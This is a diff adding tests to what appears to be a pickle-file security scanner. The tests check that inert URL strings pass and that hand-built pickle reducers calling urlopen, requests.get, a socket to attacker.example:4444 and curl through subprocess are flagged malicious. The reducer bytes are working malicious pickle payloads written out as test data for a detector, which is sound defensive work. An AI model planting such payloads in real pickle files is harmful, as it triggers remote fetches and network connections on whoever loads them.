@@ -3058,6 +3058,43 @@ def test_scan_bytes_allows_benign_security_documentation_strings() -> None:
     assert report.findings == ()
 
 
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "https://example.invalid/docs/os.system(command)",
+        "https://example.invalid/api/subprocess.run(args)",
+        "https://example.invalid/reference/requests.get(url)",
+        "https://github.com/example/project/blob/main/loader.py",
+    ],
+)
+def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str) -> None:
+    report = scan_bytes(pickle.dumps({"metadata_url": literal}, protocol=4), source="url-metadata.pkl")
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.CLEAN
+    assert report.findings == ()
+
+
+@pytest.mark.parametrize(
+    ("payload", "import_reference"),
+    [
+        (b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR.", "urllib.request.urlopen"),
+        (b"crequests\nget\n(Vhttps://attacker.example/payload\ntR.", "requests.get"),
+        (b"csocket\ncreate_connection\n(Vattacker.example\nI4444\ntR.", "socket.create_connection"),
+        (b"csubprocess\nrun\n((Vcurl\nVhttps://attacker.example/payload\netR.", "subprocess.run"),
+    ],
+)
+def test_scan_bytes_keeps_network_url_reducers_actionable(payload: bytes, import_reference: str) -> None:
+    report = scan_bytes(payload, source="network-reducer.pkl")
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.MALICIOUS
+    assert any(
+        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == import_reference
+        for finding in report.findings
+    )
+
+
 @pytest.mark.parametrize("literal", ["__a__", "__x_y__"])
 def test_scan_bytes_allows_user_defined_dunder_metadata_literals(literal: str) -> None:
     report = scan_bytes(pickle.dumps({"metadata": literal}, protocol=4), source="user-dunder.pkl")
